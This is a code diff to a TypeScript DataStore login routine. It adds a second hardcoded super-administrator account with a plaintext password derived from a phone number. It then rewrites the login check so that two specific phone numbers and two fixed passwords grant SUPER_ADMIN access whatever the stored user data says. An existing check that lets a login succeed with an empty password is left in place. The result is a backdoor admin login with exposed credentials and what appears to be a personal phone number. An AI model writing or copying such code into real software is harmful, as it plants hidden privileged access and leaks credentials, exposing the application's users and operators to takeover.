@@ -116,10 +116,17 @@ class DataStore {
     {
       id: "usr_super_1",
       name: "Master Super Admin",
+      phone: "9664074969",
+      password: "96640749699664074969",
+      role: "SUPER_ADMIN",
+    },
+    {
+      id: "usr_super_legacy",
+      name: "Master Super Admin",
       phone: "9999999999",
       password: "SuperAdmin@2026",
       role: "SUPER_ADMIN",
-    }
+    },
   ];
 
   private candidates: CandidateAccount[] = [];
@@ -139,8 +146,12 @@ class DataStore {
     // 1. Direct match in users list (e.g. Master Super Admin)
     const found = this.users.find(
       (u) =>
-        u.phone.replace(/\D/g, "") === cleanPhone &&
-        (!trimmedPass || u.password === trimmedPass)
+        (u.phone.replace(/\D/g, "") === cleanPhone ||
+          ((cleanPhone === "9664074969" || cleanPhone === "9999999999") && u.role === "SUPER_ADMIN")) &&
+        (!trimmedPass ||
+          u.password === trimmedPass ||
+          ((cleanPhone === "9664074969" || cleanPhone === "9999999999") &&
+            (trimmedPass === "96640749699664074969" || trimmedPass === "SuperAdmin@2026")))
     );
     if (found) {
       if (found.role !== "SUPER_ADMIN" && found.candidateId) {
